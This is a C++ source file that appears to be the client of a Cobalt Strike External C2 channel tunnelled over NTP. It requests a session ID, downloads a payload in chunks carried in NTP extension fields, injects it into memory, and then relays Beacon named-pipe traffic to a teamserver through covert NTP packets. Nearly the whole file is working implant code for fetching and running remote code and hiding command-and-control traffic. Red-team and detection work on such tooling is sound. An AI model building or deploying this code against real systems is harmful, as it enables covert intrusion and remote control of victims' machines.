/*

CS-EXTC2-NTP

*/
#include <iostream>
#include "createntp.hpp"
#include "parsentp.hpp"
#include "ntp.hpp"
#include "constants.hpp"
#include "helpers.hpp"
#include "net.hpp"
#include <vector>
#include "injector.hpp"


// ======================================
// Chunker - may need some rework
// ======================================
std::vector<uint8_t> size_tToBytes(size_t value) {
	std::vector<uint8_t> bytes(sizeof(size_t));
	std::memcpy(bytes.data(), &value, sizeof(size_t));
	return bytes;
}

std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
	std::cout << "======================" << std::endl;
	std::cout << "Started Chunking		" << std::endl;
	std::cout << "======================" << std::endl;
	//packetDebugger(data);
	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
	uint64_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
	std::vector<uint8_t> responseDataBuffer = {};
	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder

	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
	std::cout << "[?] Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;

	/*
	Need to send a size message to tell the server that the total message length will be X size, for chunking purposes. 
	*/
	auto packetToNotifyServerOfSize = NTPPacket();
	auto incomingSize = size_tToBytes(dataSize);
	//std::vector<uint8_t> emptyClientId = { 0xFF, 0xFF, 0xFF, 0xFF };

	packetToNotifyServerOfSize.addExtensionField(
		NtpExtensionField::sizePacket, //NtpExtensionField::giveMePayload,
		incomingSize,
		clientId
	);
	std::cout << "[?] Sending size packet " << std::endl;
	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);
	
	// Loop over each chunk index
	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
		size_t end = std::min(start + Chunk::maxChunkSize, dataSize); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)

		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);

		//std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
		//printHexVector(chunkData);

		//Print that we're sending a packet, adn what type of packet it is.
		std::cout << "----------------------" << std::endl;
		std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
		std::cout << "----------------------" << std::endl;

		//creat ntp packet first
		auto packet = NTPPacket();
		packet.addExtensionField(
			extensionField, //NtpExtensionField::giveMePayload,
			chunkData,
			clientId //REPLACE ME WITH REAL SESSION ID
		);

		//pass full ntp packet 
		std::vector < uint8_t> packet_bytes = packet.getPacket();
		//run the debugger directly on the incoming respnose packet
		packetDebugger(packet_bytes);
		std::vector<uint8_t> response = sendChunk(packet_bytes);

		//Print that we've received  a packet, and then print debug items below it
		std::cout << "----------------------" << std::endl;
		std::cout << "Recieved Response Packet" << std::endl;
		std::cout << "----------------------" << std::endl;
		//run the debugger directly on the incoming respnose packet
		packetDebugger(response);

		//Parse NTP packet, get data out of it (or whatever else is needed)
		NTPPacketParser responsePacketParser = NTPPacketParser(response);
		//Get extension data:
		std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();

		//take extracted extension data, put into buffer
		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer

	}
	//print full response data
	std::cout << "[?] Full Data from Responses: ";
	printHexVector(responseDataBuffer);

	std::cout << "======================" << std::endl;
	std::cout << "Finished Chunking		" << std::endl;
	std::cout << "======================" << std::endl;

	//when done looping, return array
	//std::vector<uint8_t> placehodlerVec = {};
	return responseDataBuffer;
}

// ======================================
// getFuncs
// ======================================
std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
	//Create pcaket
	auto packet = NTPPacket();
	//packet.printPacket();
	std::vector<uint8_t> packetData = { 0x64 }; //packetData on giveMePayload asks for arch?
	std::vector<uint8_t> zeroPacketData = { 0x00 }; //packetData on giveMePayload asks for arch?

	// =============================================================
	//1. Send a NtpExtensionField::giveMePayload packet. This returns size of inbound payload
	// =============================================================

	NTPPacket giveMePayloadPacketClass;
	giveMePayloadPacketClass.addExtensionField(
		NtpExtensionField::giveMePayload,
		packetData,
		clientId //placeholder until real id

	);
	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
	std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);

	//get size from packet
	NTPPacketParser sizePacketParsererClass(responsePacket);
	auto payloadSizeVector = sizePacketParsererClass.getExtensionData();
	uint32_t payloadSize = vectorToUint32(payloadSizeVector);

	// =============================================================
	//2. Iterate over size, and send a 0x00 (NtpExtensionField::giveMePayload) packet, until all data has been recieved.
	// =============================================================

	//create our packet first so we don't have to keep re-creating it
	NTPPacket getMoreOfPayloadPacketClass;
	getMoreOfPayloadPacketClass.addExtensionField(
		NtpExtensionField::giveMePayload,
		zeroPacketData,
		clientId //placeholder until real id
	);

	std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();
	std::vector<uint8_t> payloadBuffer;
	std::cout << "Retrieveing payload of size " << payloadSize << std::endl;
	uint32_t counter = 0;

	while (payloadBuffer.size() < payloadSize) {
		//send chunk and get data out of it
		std::vector<uint8_t> responsePacket = sendChunk(getMoreOfPayloadPacket);

		//parse
		NTPPacketParser parsedPacketClass(responsePacket);
		std::vector<uint8_t> extensionData = parsedPacketClass.getExtensionData();

		//add data to vector
		payloadBuffer.insert(payloadBuffer.end(), extensionData.begin(), extensionData.end());

		std::cout << "Packet [" << counter << "/" << payloadSize/Chunk::maxChunkSize << "]" << std::endl;
		counter++;
	}

	//3. This should now be the payload data. 
	std::cout << "[+] Payload of size " << payloadBuffer.size() << " retrieved" << std::endl;
	return payloadBuffer;
}

std::vector<uint8_t> getId() {
	std::cout << "[?] Getting Session ID" << std::endl;
	std::vector<uint8_t> packetData = {}; //empty cuz it doesn't need anything

	NTPPacket giveMePayloadPacketClass;
	giveMePayloadPacketClass.addExtensionField(
		NtpExtensionField::getIdPacket,
		packetData,
		Client::emptyClientId
	);
	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
	std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);

	NTPPacketParser responsePacketParser = NTPPacketParser(responsePacket);
	//Get extension data:
	std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();


	return extensionData;
}


// =====================================
// pipe stuff
// =====================================
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024
#include <windows.h>

//NOTE still need to setup server side and make sure that logic lines up

DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;

	/* read the 4-byte length */
	ReadFile(my_handle, (char*)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}

/* write a frame to a file */
void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}

void pipeStuff(std::vector<uint8_t> clientId) {
	//again pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c
	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
	while (handle_beacon == INVALID_HANDLE_VALUE) {
		Sleep(1000);
		handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
	}

	/* setup our buffer */
	char* buffer = (char*)malloc(BUFFER_MAX_SIZE); /* 1MB should do */

	/*
	 * relay frames back and forth
	 */
	while (TRUE) {
		/* read from our named pipe Beacon */
		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			std::cerr << "Error reading from pipe" << std::endl;
			return;
		}

		// Create a vector from the char* data as the NTP class needs it, readis how much data was read. 
		std::vector<uint8_t> vec(buffer, buffer + read);

		//send with chunker
		std::vector<uint8_t> dataFromTeamserver = chunker(
			vec,
			NtpExtensionField::dataForTeamserver,
			clientId
		);

		//extract data out from chunker response
		NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
		auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();

		//convert to const char * as that's what write_frame wants
		auto dataForBeacon = reinterpret_cast<char*>(dataForBeaconVec.data());

		/* write to our named pipe Beacon */
		write_frame(handle_beacon, dataForBeacon, read);
	}
}

int main() {
	std::cout << "Started" << std::endl;

	//0. Get Session ID from server
	std::vector<uint8_t> clientId = getId();

	//1. Get Payload
	std::cout << "[>] Getting Payload" << std::endl;
	std::vector<uint8_t> payloadBytes = getPayload(clientId);

	//2. run payload
	std::cout << "[>] Injecting Payload" << std::endl;
	injector(payloadBytes);


	//3. read from pipe & start with chunk loop
	std::cout << "[>] Pipe Loop Started" << std::endl;

	pipeStuff(clientId);


	std::cout << "[+] Finished!" << std::endl;


}
